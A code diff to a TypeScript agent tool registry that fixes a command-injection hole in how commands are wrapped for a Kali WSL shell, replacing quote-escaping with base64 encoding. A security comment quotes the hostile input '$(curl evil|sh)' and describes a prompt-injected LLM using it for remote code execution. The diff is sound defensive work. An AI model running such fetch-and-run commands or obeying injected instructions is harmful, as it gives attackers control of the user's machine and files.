@@ -1001,10 +1001,25 @@ export class ConstructToolRegistryService extends Disposable implements IConstru
                 const cwd = input.cwd as string | undefined;
 
                 try {
-                        // If Kali profile is selected, wrap command for WSL
-                        const actualCommand = this._terminalProfile === 'kali' && this._kaliAvailable
-                                ? `wsl -d kali-linux -- bash -c "${command.replace(/"/g, '\\"')}"`
-                                : command;
+                        // SEC-7 (C3 fix): WSL command wrapping must not be injectable.
+                        // Previous code interpolated the command into a double-quoted
+                        // `bash -c "..."` string with only `"` escaped. Inside a
+                        // double-quoted bash string, `$(...)`, backticks, and `\`
+                        // are still expanded — a prompt-injected LLM (or any caller
+                        // that controls `command`) could pass `$(curl evil|sh)` and
+                        // get full RCE inside the WSL context, which has access to
+                        // the user's home dir mounted under /mnt/c/Users/...
+                        //
+                        // Fix: base64-encode the command and decode it inside bash.
+                        // Base64 output contains only [A-Za-z0-9+/=], so no shell
+                        // metacharacter can survive into the outer host shell or the
+                        // WSL bash -c argument. The decoded payload is piped to a
+                        // second bash instance which executes it verbatim.
+                        let actualCommand = command;
+                        if (this._terminalProfile === 'kali' && this._kaliAvailable) {
+                                const b64 = this._base64EncodeUtf8(command);
+                                actualCommand = `wsl -d kali-linux -- bash -c 'echo ${b64} | base64 -d | bash'`;
+                        }
 
                         // P0-4 FIX: child_process should not be used in browser layer.
                         // Terminal commands must be executed through ITerminalExecutor service
@@ -1494,6 +1509,26 @@ export class ConstructToolRegistryService extends Disposable implements IConstru
                         // ignore
                 }
                 return 'full';
+        }
+
+        /**
+         * SEC-7 (C3 fix): Base64-encode a UTF-8 string for safe shell transport.
+         *
+         * Used to pass an arbitrary shell command through `wsl ... bash -c '...'
+         * without risking command-injection via `$(...)`, backticks, or `\` in
+         * the inner bash string. Base64 output is a single token containing only
+         * [A-Za-z0-9+/=] — no shell metacharacter can survive.
+         *
+         * Browser-safe: uses TextEncoder + btoa (no Node `Buffer` dependency).
+         * Stack-safe: iterates rather than spreading the Uint8Array.
+         */
+        private _base64EncodeUtf8(str: string): string {
+                const bytes = new TextEncoder().encode(str);
+                let bin = '';
+                for (let i = 0; i < bytes.length; i++) {
+                        bin += String.fromCharCode(bytes[i]);
+                }
+                return btoa(bin);
         }
 
         private async executeListDirectory(input: Record<string, unknown>): Promise<IToolResult> {
